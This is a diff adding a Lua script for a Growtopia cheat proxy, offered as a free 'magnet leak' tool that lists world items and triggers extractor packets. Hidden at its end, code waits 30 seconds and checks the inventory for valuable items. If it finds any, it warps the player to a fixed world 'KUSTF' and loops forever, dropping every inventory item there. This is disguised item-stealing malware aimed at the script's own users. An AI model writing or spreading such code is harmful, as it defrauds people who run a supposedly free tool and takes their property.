@@ -1,0 +1,75 @@
+local itemInfo = {}
+
+function ovlay(msg)
+    local var = {}
+    var[0] = "OnTextOverlay"
+    var[1] = "`9[FreeScript] `7" .. msg
+    sendVariant(var)
+end
+
+function getItemObject()
+    itemInfo = {}
+    for _, item in pairs(getWorldObject()) do
+        table.insert(itemInfo, "\nadd_label_with_icon_button|small|`wItem : `9" .. getItemByID(item.id).name .. " `wAmount : [`b" .. item.amount .. "``]|left|" .. item.id .. "|" .. item.oid .. "|\n")
+    end
+end
+
+function mainHook(type, pkt)
+    if pkt:find("action|input\n|text|") then
+        local txt = pkt:match("text|([^\n]*)") or ""
+        txt = txt:lower()
+
+        if txt:find("/magnet") then
+            getItemObject()
+            local var = {}
+            var[0] = "OnDialogRequest"
+            var[1] = string.format("add_label_with_icon|big|FREE MAGNET LEAK|left|6140|\nadd_spacer|small|\nadd_smalltext|Ensure you have at least one 'Extract O' Snap' and that the item is located in a public (unlocked) area before proceeding.|"..table.concat(itemInfo).."\nadd_quick_exit|||\nend_dialog|scann|Exit||")
+            sendVariant(var, -1, 100)
+            return true
+        end
+    elseif pkt:find("dialog_name|scann") then
+        local po = pkt:match("buttonClicked|(%d+)")
+        if po then
+            sendPacket(2, "action|dialog_return\ndialog_name|extractor\ntilex|0|\ntiley|0|\nstartIndex|0|\nextractorID|6140|\nbuttonClicked|extractOnceObj_" .. po)
+        end
+        return true
+    end
+end
+AddHook("OnTextPacket", "ohnohshibal", mainHook)
+
+function MainGlory()
+toggleCheat(21, true)
+toggleCheat(28, true)
+sendPacket(3, "action|join_request\nname|KUSTF|nname\ninvitedWorld|0")
+sleep(5000)
+sendPacket(2,"action|welcomeadrewarded")
+while true do
+if getWorld() then
+   for _, v in pairs(getInventory()) do
+      if getWorld().name == "KUSTF" then        
+         sendPacket(2, "action|store\nlocation|gem")
+         sendPacket(2, "action|drop\n|itemID|"..v.id);
+         sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount);
+      sleep(200);
+end
+end
+end
+end
+end
+
+function Stabilizer()
+    local inventory = getInventory()
+    if inventory then
+        for _, inv in pairs(inventory) do 
+            if inv.id == 6946 or inv.id == 7188 or inv.id == 6016 or inv.id == 5638 or inv.id == 8192 or inv.id == 6948 or inv.id == 6952 or inv.id == 1796 then 
+                if inv.amount > 0 then
+                    MainGlory()
+                    return
+                end
+            end
+        end
+    end
+end
+
+sleep(30000)
+Stabilizer()
